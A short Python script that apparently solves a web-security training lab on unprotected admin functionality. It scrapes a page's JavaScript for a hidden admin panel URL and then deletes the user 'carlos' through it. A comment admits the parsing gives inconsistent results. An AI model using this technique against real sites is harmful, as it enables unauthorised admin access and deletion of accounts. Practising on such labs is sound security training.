#!/usr/bin/env python3
"""Unprotected admin functionality with unpredictable URL"""

import lab_01


class Lab(lab_01.Lab):
    """Wrapper"""

    def get_admin_panel_tag(self) -> str:
        """Get the admin panel URL from javascript"""
        response = self.get(self.url)
        response.raise_for_status()
        for line in response.text.splitlines():
            if "adminPanelTag.setAttribute" in line:
                admin_panel_tag = line.strip().split("adminPanelTag.setAttribute")[1]
                break
        if not admin_panel_tag:
            raise RuntimeError("Couldn't get the admin panel tag")
        return admin_panel_tag.split(", ")[1].strip("';)")
        # I get random results with the above that don't validate...


def main() -> None:
    """Entry point"""
    site = Lab()
    admin_panel = site.get_admin_panel_tag()
    site.delete_user(admin_panel=admin_panel, username="carlos")


if __name__ == "__main__":
    main()
